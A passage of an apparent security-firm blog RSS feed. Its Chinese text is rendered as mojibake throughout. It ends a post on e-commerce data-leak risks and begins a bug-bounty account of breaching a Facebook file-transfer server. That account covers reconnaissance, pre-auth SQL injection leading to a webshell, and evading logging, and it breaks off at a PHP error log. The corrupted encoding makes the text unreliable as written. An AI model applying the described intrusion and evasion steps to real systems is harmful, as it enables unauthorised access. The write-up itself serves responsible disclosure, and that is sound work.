&lt;p&gt;ç•¶ä¼æ¥­è£¡è£¡å¤–å¤–éƒ½é˜²ç¦¦å¥½äº†ï¼Œå€‹è³‡é‚„åœ¨å¤–æ´©ï¼Œåˆ°åº•ç™¼ç”Ÿä»€éº¼äº‹æƒ…äº†å‘¢ï¼Ÿåˆ¥å¿˜äº†ä¸€å€‹é›»å•†ç¶²ç«™æœ‰å„ç¨®èˆ‡å¤–ç•Œæ©‹æ¥çš„æœå‹™ï¼Œä¾‹å¦‚äº¤æ˜“çš„é‡‘æµã€é‹è¼¸çš„ç‰©æµã€‚è‹¥æ­é…çš„å¤–éƒ¨ç³»çµ±é­åˆ°å…¥ä¾µï¼Œå€‹è³‡ä¸€æ¨£æœƒè¢«å–å¾—ã€‚ä½†æ°‘çœ¾ã€åª’é«”åªæœƒè¦ºå¾—ã€Œæˆ‘åœ¨é€™å®¶é›»å•†å¹³å°è²·æ±è¥¿è¢«è©é¨™ã€ï¼Œè€Œæ€ªç½ªåˆ°ä¼æ¥­æœ¬èº«ã€‚ä¼æ¥­æœ‰è²¬ä»»è¦æ±‚é…åˆçš„å» å•†ä¸€åŒå°‡è³‡å®‰ã€å€‹è³‡æŠŠé—œå¥½ã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šé…åˆå» å•†çš„è³‡å®‰è¦ç¯„ã€æ»²é€æ¸¬è©¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;æ”»æ“Šè€…ç”¨å·²å¤–æ´©å¸³è™Ÿå¯†ç¢¼ç™»å…¥é›»å•†ç¶²ç«™&quot;&gt;æ”»æ“Šè€…ç”¨å·²å¤–æ´©å¸³è™Ÿå¯†ç¢¼ç™»å…¥é›»å•†ç¶²ç«™&lt;/h4&gt;

&lt;p&gt;è³‡å®‰çš„è²¬ä»»ä¸¦ä¸åƒ…åœ¨ä¼æ¥­ï¼Œæœ‰çš„æ™‚å€™æ¶ˆè²»è€…æœ¬èº«å¸³è™Ÿçš„å®‰å…¨ä¹Ÿæœƒå½±éŸ¿åˆ°é›»å•†ç¶²ç«™çš„æ¸…è­½ã€‚ç›®å‰æ°‘çœ¾åªè¦æ¥æ”¶åˆ°è©é¨™é›»è©±ï¼Œç›´è¦ºéƒ½æœƒæ˜¯åœ¨æŸå€‹åº—å®¶çš„äº¤æ˜“è¢«é§­ï¼Œè¢«å–å¾—è³‡æ–™å¾Œè²©å”®çµ¦è©é¨™é›†åœ˜ï¼Œå› è€Œå›å ±çµ¦ 165 ç­‰åè©é¨™å°ˆç·šã€‚é€™ç¨®æ¡ˆä¾‹ä¹Ÿæœƒç®—åœ¨é›»å•†ç¶²ç«™çš„å¸³ä¸Šï¼Œä½†å»ä¸ä¸€å®šæ˜¯é›»å•†ç¶²ç«™çš„å•é¡Œã€‚é€™æ¨£çš„æ”»æ“Šæ‰‹æ³•ä¹Ÿä¿—ç¨±ã€Œæ’åº«ã€ã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šä¼æ¥­é–“çš„è¯é˜²ã€æä¾›ä½¿ç”¨è€…å¸³è™Ÿä¿è­·&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;è²·å®¶åœ¨è©é¨™é›†åœ˜çš„è³£å ´äº¤æ˜“&quot;&gt;è²·å®¶åœ¨è©é¨™é›†åœ˜çš„è³£å ´äº¤æ˜“&lt;/h4&gt;

&lt;p&gt;åªè¦æœ‰åˆ©å¯åœ–ï¼Œè©é¨™é›†åœ˜å°±æœƒç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„æƒ³ç²å–åˆ©ç›Šã€‚ç•¶ç³»çµ±å·²ç¶“é”æˆåŸºæœ¬çš„å®‰å…¨ã€ä½¿ç”¨è€…å¤–æ´©çš„å¸³è™Ÿä¹Ÿå·²ç¶“ç„¡æ³•åˆ©ç”¨ä¹‹å¾Œï¼Œè©é¨™é›†åœ˜å°‡å†æ”»æ“Šäººæ€§çš„æ¼æ´ï¼Œé–‹è¨­è²©è³£ç†±é–€å•†å“çš„è³£å ´ï¼Œå¸å¼•ç„¡è¾œçš„å—å®³è€…è³¼è²·ã€‚æˆ–è€…åœ¨è³£å ´çš„ç•™è¨€å€å¡Šå‡å†’è³£å®¶ï¼Œç•™ä¸‹è‡ªå·±çš„ LINE èˆ‡æ¶ˆè²»è€…æºé€šï¼Œé€²è¡Œè©é¨™ã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šæ¶ˆè²»è€…å®‰å…¨å®£å°&lt;/p&gt;

&lt;h3 id=&quot;é›»å•†æ¥­è€…è©²å¦‚ä½•è‡ªä¿&quot;&gt;é›»å•†æ¥­è€…è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;åªè¦æœ‰åˆ©ç›Šçš„åœ°æ–¹ï¼Œå°±æœƒæœ‰è³‡å®‰å±æ©Ÿã€‚é›–èªªé“é«˜ä¸€å°ºé­”é«˜ä¸€ä¸ˆï¼Œä½†æ¥­è€…ä¸¦éåªèƒ½ç­‰è‘—è¢«å®°ã€‚ç¶“ç‡Ÿç¶²ç«™æœ€é‡è¦çš„å°±æ˜¯ä¿è­·é¡§å®¢çš„è³‡æ–™ï¼Œæ˜ç™½é¢¨éšªçš„æ‰€åœ¨ã€‚ç›¤é»æ‰‹ä¸Šçš„å€‹è³‡ä½ç½®ã€æ©Ÿåˆ¶ã€æªæ–½ï¼Œè¬¹æ…å®‰æ’è³‡å®‰è¦åŠƒï¼Œç¢ºä¿å°‡å®‰å…¨çš„é¢¨éšªé™åˆ°æœ€ä½ã€‚æ›´é€²ä¸€æ­¥ä¹Ÿå¯ä»¥å»ºç«‹èˆ‡è³‡å®‰äººå“¡è‰¯å¥½çš„é—œä¿‚ï¼Œå…¬é–‹æ¼æ´é€šå ±ç®¡é“åŠçå‹µæ©Ÿåˆ¶ï¼Œé¼“å‹µè³‡å®‰äººå“¡å„ªå…ˆé€šå ±æ¼æ´çµ¦ä¼æ¥­ï¼Œé¿å…æµå…¥é»‘è‰²ç”¢æ¥­ã€‚ç•¶ç„¶ï¼Œèº«ç‚ºæ¶ˆè²»è€…çš„æˆ‘å€‘ï¼Œä¹Ÿæ‡‰è©²çµ¦äºˆè² è²¬çš„ä¼æ¥­æŒè²ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨æœªä¾†æˆ‘å€‘çš„æ–‡ç« å°‡æåˆ°ä¼æ¥­æ‡‰è©²æ¡å–çš„å…·é«”ä½œç‚ºï¼Œæ•¬è«‹æœŸå¾…ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce/</link>
                <guid>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce</guid>
                <pubDate>Fri, 29 Jul 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æ»²é€ Facebook çš„æ€è·¯èˆ‡ç™¼ç¾</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someoneâ€™s Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;æ»²é€ Facebook çš„æ€è·¯èˆ‡ç™¼ç¾&lt;/a&gt; (ä¸­æ–‡ç‰ˆæœ¬)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;å¯«åœ¨æ•…äº‹ä¹‹å‰&quot;&gt;å¯«åœ¨æ•…äº‹ä¹‹å‰&lt;/h3&gt;

&lt;p&gt;èº«ç‚ºä¸€ä½æ»²é€æ¸¬è©¦äººå“¡ï¼Œæ¯”èµ· Client Side çš„å¼±é»æˆ‘æ›´å–œæ­¡ Server Side çš„æ”»æ“Šï¼Œèƒ½å¤ ç›´æ¥çš„æ§åˆ¶ä¼ºæœå™¨ã€ç²å¾—æ¬Šé™æ“ä½œ SHELL æ‰çˆ½ &amp;lt;(ï¿£ï¸¶ï¿£)&amp;gt;&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶ä¸€æ¬¡å®Œç¾çš„æ»²é€ä»»ä½•å½¢å¼çš„å¼±é»éƒ½ä¸å¯å°è¦·ï¼Œåœ¨å¯¦éš›æ»²é€æ™‚å¶çˆ¾é‚„æ˜¯éœ€è¦äº› Client Side å¼±é»çµ„åˆå¯ä»¥æ›´å®Œç¾çš„æ§åˆ¶ä¼ºæœå™¨ï¼Œä½†æ˜¯åœ¨å°‹æ‰¾å¼±é»æ™‚æˆ‘æœ¬èº«é‚„æ˜¯å…ˆåå‘ä»¥å¯ç›´æ¥é€²å…¥ä¼ºæœå™¨çš„æ–¹å¼ä¾†å»å°‹æ‰¾é¢¨éšªé«˜ã€èƒ½é•·é©…ç›´å…¥çš„å¼±é»ã€‚&lt;/p&gt;

&lt;p&gt;éš¨è‘— Facebook åœ¨ä¸–ç•Œä¸Šè¶Šä¾†è¶Šç«ç´…ã€ç”¨æˆ¶é‡è¶Šä¾†è¶Šå¤šï¼Œä¸€ç›´ä»¥ä¾†éƒ½æœ‰æƒ³è¦å˜—è©¦çœ‹çœ‹çš„æƒ³æ³•ï¼Œæ°å·§ Facebook åœ¨ 2012 å¹´é–‹å§‹æœ‰äº† &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty&lt;/a&gt; çé‡‘çµäººçš„æ©Ÿåˆ¶è®“æˆ‘æ›´èºèºæ¬²è©¦ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ä¸€èˆ¬å¦‚ç”±æ»²é€çš„è§’åº¦ä¾†èªªç¿’æ…£æ€§éƒ½æœƒå¾æ”¶é›†è³‡æ–™ã€åµæŸ¥é–‹å§‹ï¼Œé¦–å…ˆç•Œå®šå‡ºç›®æ¨™åœ¨ç¶²è·¯ä¸Šçš„ â€œç¯„åœâ€ æœ‰å¤šå¤§ï¼Œå§‘ä¸”å¯ä»¥è©•ä¼°ä¸€ä¸‹å¾ä½•è™•æ¯”è¼ƒæœ‰æ©Ÿæœƒä¸‹æ‰‹ã€‚ä¾‹å¦‚:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Google Hacking åˆ°ä»€éº¼è³‡æ–™?&lt;/li&gt;
  &lt;li&gt;ç”¨äº†å¹¾å€‹ B æ®µçš„ IP ? C æ®µçš„ IP ?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;ç”¨äº†ä»€éº¼åŸŸå? å…§éƒ¨ä½¿ç”¨çš„åŸŸå? æ¥è‘—åšå­åŸŸåçš„çŒœæ¸¬ã€æƒæ&lt;/li&gt;
  &lt;li&gt;å…¬å¸å¹³å¸¸æ„›ç”¨ä»€éº¼æ¨£æŠ€è¡“ã€è¨­å‚™?&lt;/li&gt;
  &lt;li&gt;åœ¨ Github, Pastebin ä¸Šæ˜¯å¦æœ‰æ´©æ¼ä»€éº¼è³‡è¨Š?&lt;/li&gt;
  &lt;li&gt;â€¦etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç•¶ç„¶ Bug Bounty ä¸¦ä¸æ˜¯è®“ä½ ç„¡é™åˆ¶çš„æ”»æ“Šï¼Œå°‡æ‰€è’é›†åˆ°çš„ç¯„åœèˆ‡ Bug Bounty æ‰€å…è¨±çš„ç¯„åœåšäº¤é›†å¾Œæ‰æ˜¯ä½ çœŸæ­£å¯ä»¥å»å˜—è©¦çš„ç›®æ¨™ã€‚&lt;/p&gt;

&lt;p&gt;ä¸€èˆ¬ä¾†èªªå¤§å…¬å¸åœ¨æ»²é€ä¸­æ¯”è¼ƒå®¹æ˜“å‡ºç¾çš„å•é¡Œé»é€™è£¡èˆ‰å¹¾å€‹ä¾‹å­ä¾†æ¢è¨&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å°å¤šæ•¸å¤§å…¬å¸è€Œè¨€ï¼Œâ€&lt;strong&gt;ç¶²è·¯é‚Šç•Œ&lt;/strong&gt;â€ æ˜¯æ¯”è¼ƒé›£é¡§åŠã€å®¹æ˜“å‡ºç¾å•é¡Œçš„ä¸€å¡Šï¼Œç•¶å…¬å¸è¦æ¨¡è¶Šå¤§ï¼ŒåŒæ™‚æ“æœ‰æ•¸åƒã€æ•¸è¬å°æ©Ÿå™¨åœ¨ç·šï¼Œç¶²ç®¡å¾ˆé›£é¡§åŠåˆ°æ¯å°æ©Ÿå™¨ã€‚åœ¨æ”»é˜²è£¡ï¼Œé˜²å®ˆè¦é˜²çš„æ˜¯ä¸€å€‹é¢ï¼Œä½†æ”»æ“Šåªéœ€æ‰¾å€‹ä¸€å€‹é»å°±å¯ä»¥çªç ´ï¼Œæ‰€ä»¥é˜²å®ˆæ–¹ç›¸å°è™•æ–¼å¼±å‹¢ï¼Œæ”»æ“Šè€…åªè¦æ‰¾åˆ°ä¸€å°ä½æ–¼ç¶²è·¯é‚Šç•Œçš„æ©Ÿå™¨å…¥ä¾µé€²å»å°±å¯ä»¥é–‹å§‹åœ¨å…§ç¶²é€²è¡Œæ»²é€äº†!&lt;/li&gt;
  &lt;li&gt;å°æ–¼ â€œ&lt;strong&gt;é€£ç¶²è¨­å‚™&lt;/strong&gt;â€ çš„å®‰å…¨æ„è­˜ç›¸å°è–„å¼±ï¼Œç”±æ–¼é€£ç¶²è¨­å‚™é€šå¸¸ä¸æœƒæä¾› SHELL çµ¦ç®¡ç†å“¡åšé€²ä¸€æ­¥çš„æ“ä½œï¼Œåªèƒ½ç”±è¨­å‚™æœ¬èº«æ‰€æä¾›çš„ä»‹é¢è¨­å®šï¼Œæ‰€ä»¥é€šå¸¸å°æ–¼è¨­å‚™çš„é˜²ç¦¦éƒ½æ˜¯å¾ç¶²è·¯å±¤ä¾†æŠµæ“‹ï¼Œä½†å¦‚é‡åˆ°è¨­å‚™æœ¬èº«çš„ 0-Day æˆ–è€…æ˜¯ 1-Day å¯èƒ½é€£è¢«å…¥ä¾µäº†éƒ½ä¸è‡ªè¦ºã€‚&lt;/li&gt;
  &lt;li&gt;äººçš„å®‰å…¨ï¼Œéš¨è‘— â€œ&lt;strong&gt;ç¤¾å·¥åº«&lt;/strong&gt;â€ çš„å´›èµ·ï¼Œæœ‰æ™‚å¯ä»¥è®“ä¸€æ¬¡æ»²é€çš„æµç¨‹è®Šå¾—ç•°å¸¸ç°¡å–®ï¼Œå¾å…¬é–‹è³‡æ–™æ‰¾å‡ºå…¬å¸å“¡å·¥åˆ—è¡¨ï¼Œå†å¾ç¤¾å·¥åº«æ‰¾åˆ°å¯ä»¥ç™»å…¥ VPN çš„å“¡å·¥å¯†ç¢¼å°±å¯ä»¥é–‹å§‹é€²è¡Œå…§ç¶²æ»²é€ï¼Œå°¤å…¶ç•¶ç¤¾å·¥åº«æ•¸é‡è¶Šä¾†è¶Šå¤š â€œ&lt;strong&gt;é‡è®Šæˆè³ªè®Š&lt;/strong&gt;â€ æ™‚åªè¦é—œéµäººç‰©çš„å¯†ç¢¼åœ¨ç¤¾å·¥åº«ä¸­å¯æ‰¾åˆ°ï¼Œé‚£ä¼æ¥­çš„å®‰å…¨æ€§å°±å…¨ç„¶çªç ´ :P
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç†æ‰€ç•¶ç„¶åœ¨å°‹æ‰¾ Facebook å¼±é»æ™‚æœƒä»¥å¹³å¸¸é€²è¡Œæ»²é€çš„æ€è·¯é€²è¡Œï¼Œåœ¨é–‹å§‹æœé›†è³‡æ–™æ™‚é™¤äº†é‡å° Facebook æœ¬èº«åŸŸåæŸ¥è©¢å¤–ä¹Ÿå°è¨»å†Šä¿¡ç®±é€²è¡Œ Reverse Whois æ„å¤–ç™¼ç¾äº†å€‹å¥‡å¦™çš„åŸŸååç¨±&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW ä¼¼ä¹æ˜¯ â€œ&lt;strong&gt;TheFacebook Network&lt;/strong&gt;â€ çš„ç¸®å¯«&lt;br /&gt;
å†è—‰ç”±å…¬é–‹è³‡æ–™ç™¼ç¾å­˜åœ¨ä¸‹é¢é€™å°é€™å°ä¼ºæœå™¨&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å“‡! vpn.tfbnw.net çœ‹èµ·ä¾†æ˜¯å€‹ Juniper SSL VPN çš„ç™»å…¥ä»‹é¢ï¼Œä¸éç‰ˆæœ¬æ»¿æ–°çš„æ²’æœ‰ç›´æ¥å¯åˆ©ç”¨çš„å¼±é»ï¼Œä¸éé€™ä¹Ÿæˆç‚ºäº†é€²å…¥å¾Œé¢æ•…äº‹çš„é–‹ç«¯ã€‚&lt;/p&gt;

&lt;p&gt;TFBNW çœ‹ä¼¼æ˜¯ Facebook å…§éƒ¨ç”¨çš„åŸŸåï¼Œä¾†æƒæƒ vpn.tfbnw.net åŒç¶²æ®µçœ‹æœƒæœ‰ä»€éº¼ç™¼ç¾&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¾é€™å¹¾å°æ©Ÿå™¨å¤§è‡´å¯ä»¥åˆ¤æ–·é€™å€‹ç¶²æ®µå°æ–¼ Facebook ä¾†èªªæ‡‰è©²æ˜¯ç›¸å°é‡è¦çš„ç¶²æ®µï¼Œä¹‹å¾Œä¸€åˆ‡çš„æ•…äº‹å°±å¾é€™è£¡é–‹å§‹ã€‚&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;å¼±é»ç™¼ç¾&quot;&gt;å¼±é»ç™¼ç¾&lt;/h3&gt;

&lt;p&gt;åœ¨åŒç¶²æ®µä¸­ï¼Œç™¼ç¾ä¸€å°ç‰¹åˆ¥çš„ä¼ºæœå™¨&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;
&lt;em&gt;â†‘ files.fb.com ç™»å…¥ä»‹é¢&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å¾ LOGO ä»¥åŠ Footer åˆ¤æ–·æ‡‰è©²æ˜¯ Accellion çš„ Secure File Transfer (ä»¥ä¸‹ç°¡ç¨± FTA)&lt;/p&gt;

&lt;p&gt;FTA ç‚ºä¸€æ¬¾æ¨™æ¦œå®‰å…¨æª”æ¡ˆå‚³è¼¸çš„ç”¢å“ï¼Œå¯è®“ä½¿ç”¨è€…ç·šä¸Šåˆ†äº«ã€åŒæ­¥æª”æ¡ˆï¼Œä¸¦æ•´åˆ AD, LDAP, Kerberos ç­‰ Single Sign-on æ©Ÿåˆ¶ï¼ŒEnterprise ç‰ˆæœ¬æ›´æ”¯æ´ SSL VPN æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆçœ‹åˆ° FTA çš„ç¬¬ä¸€ä»¶äº‹æ˜¯å»ç¶²è·¯ä¸Šæœå°‹æ˜¯å¦æœ‰å…¬é–‹çš„ Exploit å¯ä»¥åˆ©ç”¨ï¼ŒExploit æœ€è¿‘çš„æ˜¯ç”± HD Moore ç™¼ç¾ä¸¦ç™¼ä½ˆåœ¨ Rapid7 çš„é€™ç¯‡ Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¼±é»ä¸­å¯ç›´æ¥å¾ â€œ&lt;strong&gt;/tws/getStatus&lt;/strong&gt;â€ ä¸­æ´©æ¼çš„ç‰ˆæœ¬è³‡è¨Šåˆ¤æ–·æ˜¯å¦å¯åˆ©ç”¨ï¼Œåœ¨ç™¼ç¾ files.fb.com æ™‚ç‰ˆæœ¬å·²å¾æœ‰æ¼æ´çš„ 0.18 å‡ç´šè‡³ 0.20 äº†ï¼Œä¸éå°±å¾ Advisory ä¸­æ‰€é€éœ²çš„ç‰‡æ®µç¨‹å¼ç¢¼æ„Ÿè¦º FTA çš„æ’°å¯«é¢¨æ ¼å¦‚æœå†ç¹¼çºŒæŒ–æ˜å¯èƒ½é‚„æ˜¯æœƒæœ‰å•é¡Œå­˜åœ¨çš„ï¼Œæ‰€ä»¥é€™æ™‚çš„ç­–ç•¥ä¾¿é–‹å§‹å¾€å°‹æ‰¾ FTA ç”¢å“çš„ 0-Day å‰é€²!&lt;/p&gt;

&lt;p&gt;ä¸éå¾å¯¦éš›é»‘ç®±çš„æ–¹å¼å…¶å¯¦æ‰¾ä¸å‡ºä»€éº¼å•é¡Œé»åªå¥½æƒ³è¾¦æ³•å°‡æ–¹å‘è½‰ç‚ºç™½ç®±æ¸¬è©¦ï¼Œé€éå„ç¨®æ–¹å¼æ‹¿åˆ°èˆŠç‰ˆçš„ FTA åŸå§‹ç¢¼å¾Œçµ‚æ–¼å¯ä»¥é–‹å§‹ç ”ç©¶äº†!&lt;/p&gt;

&lt;p&gt;æ•´å€‹ FTA ç”¢å“å¤§è‡´æ¶æ§‹&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¶²é ç«¯ä»‹é¢ä¸»è¦ç”± Perl ä»¥åŠ PHP æ§‹æˆ&lt;/li&gt;
  &lt;li&gt;PHP åŸå§‹ç¢¼çš†ç¶“é IonCube åŠ å¯†&lt;/li&gt;
  &lt;li&gt;åœ¨èƒŒæ™¯è·‘äº†è¨±å¤š Perl çš„ Daemon&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é¦–å…ˆæ˜¯è§£å¯† IonCude çš„éƒ¨åˆ†ï¼Œè¨±å¤šè¨­å‚™ç‚ºäº†é˜²æ­¢è‡ªå·±çš„ç”¢å“è¢«æª¢è¦–æ‰€ä»¥æœƒå°‡åŸå§‹ç¢¼åŠ å¯†ï¼Œä¸éå¥½åœ¨ FTA ä¸Šçš„ IonCude ç‰ˆæœ¬æ²’åˆ°æœ€æ–°ï¼Œå¯ä»¥ä½¿ç”¨ç¾æˆçš„å·¥å…·è§£å¯†ï¼Œä¸éç”±æ–¼ PHP ç‰ˆæœ¬çš„å•é¡Œï¼Œç´°ç¯€éƒ¨ä»½ä»¥åŠæ•¸å€¼é‹ç®—ç­‰å¯èƒ½è¦é è‡ªå·±ä¿®å¾©ä¸€ä¸‹ï¼Œä¸ç„¶æœ‰é»é›£çœ‹â€¦&lt;/p&gt;

&lt;p&gt;ç¶“éç°¡å–®çš„åŸå§‹ç¢¼å¯©æŸ¥å¾Œç™¼ç¾ï¼Œå¥½æ‰¾çš„å¼±é»æ‡‰è©²éƒ½è¢« Rapid7 æ‰¾èµ°äº† T^T&lt;br /&gt;
è€Œéœ€è¦èªè­‰æ‰èƒ½è§¸ç™¼çš„æ¼æ´åˆä¸æ€éº¼å¥½ç”¨ï¼Œåªå¥½èªçœŸé»å¾€æ·±å±¤ä¸€é»çš„åœ°æ–¹æŒ–æ˜!&lt;/p&gt;

&lt;p&gt;ç¶“éå¹¾å¤©çš„èªçœŸæŒ–æ˜ï¼Œæœ€å¾Œç¸½å…±ç™¼ç¾äº†ä¸ƒå€‹å¼±é»ï¼Œå…¶ä¸­åŒ…å«äº†&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é™¤äº†å›å ± Facebook å®‰å…¨åœ˜éšŠå¤–ï¼Œå…¶é¤˜çš„å¼±é»ä¹Ÿè£½ä½œæˆ Advisory æäº¤ Accellion æŠ€è¡“çª—å£ï¼Œç¶“éå» å•†ä¿®è£œæäº¤ CERT/CC å¾Œå–å¾—å››å€‹ CVE ç·¨è™Ÿ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è©³ç´°çš„å¼±é»ç´°ç¯€æœƒå¾… Full Disclosure Policy å¾Œå…¬å¸ƒ!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;
&lt;em&gt;â†‘ ä½¿ç”¨ Pre-Auth SQL Injection å¯«å…¥ Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å¯¦éš›æ»²é€ä¸­é€²å»ä¼ºæœå™¨å¾Œçš„ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯æª¢è¦–ç•¶å‰çš„ç’°å¢ƒæ˜¯å¦å°è‡ªå·±å‹å–„ï¼Œç‚ºäº†è¦è®“è‡ªå·±å¯ä»¥åœ¨ä¼ºæœå™¨ä¸Šå¾…çš„ä¹…å°±è¦ç›¡å¯èƒ½çš„äº†è§£ä¼ºæœå™¨ä¸Šæœ‰ä½•é™åˆ¶ã€ç´€éŒ„ï¼Œé¿é–‹å¯èƒ½æœƒè¢«ç™¼ç¾çš„é¢¨éšª :P&lt;/p&gt;

&lt;p&gt;Facebook å¤§è‡´æœ‰ä»¥ä¸‹é™åˆ¶:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;é˜²ç«ç‰†ç„¡æ³•é€£å¤–, TCP, UDP, 53, 80, 443 çš†ç„¡æ³•&lt;/li&gt;
  &lt;li&gt;å­˜åœ¨é ç«¯çš„ Syslog ä¼ºæœå™¨&lt;/li&gt;
  &lt;li&gt;é–‹å•Ÿ Auditd è¨˜éŒ„&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç„¡æ³•å¤–é€£çœ‹èµ·ä¾†æœ‰é»éº»ç…©ï¼Œä½†æ˜¯ ICMP Tunnel çœ‹ä¼¼æ˜¯å¯è¡Œçš„ï¼Œä½†é€™åªæ˜¯ä¸€å€‹ Bug Bounty Program å…¶å¯¦ä¸éœ€è¦å¤ªéº»ç…©å°±ç´”ç²¹ä»¥ Webshell æ“ä½œå³å¯ã€‚&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ä¼¼ä¹æœ‰é»å¥‡æ€ª&quot;&gt;ä¼¼ä¹æœ‰é»å¥‡æ€ª?&lt;/h3&gt;

&lt;p&gt;æ­£ç•¶æ”¶é›†è­‰æ“šæº–å‚™å›å ± Facebook å®‰å…¨åœ˜éšŠæ™‚ï¼Œå¾ç¶²é æ—¥èªŒä¸­ä¼¼ä¹çœ‹åˆ°ä¸€äº›å¥‡æ€ªçš„ç—•è·¡ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆæ˜¯åœ¨ â€œ&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;â€ ä¸­çœ‹åˆ°ä¸€äº›å¥‡æ€ªçš„ PHP éŒ¯èª¤è¨Šæ¯ï¼Œå¾éŒ¯èª¤è¨Šæ¯ä¾†çœ‹ä¼¼ä¹åƒæ˜¯é‚Šæ”¹ Code é‚ŠåŸ·è¡Œæ‰€ç”¢ç”Ÿçš„éŒ¯èª¤?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
&lt;em&gt;â†‘ PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
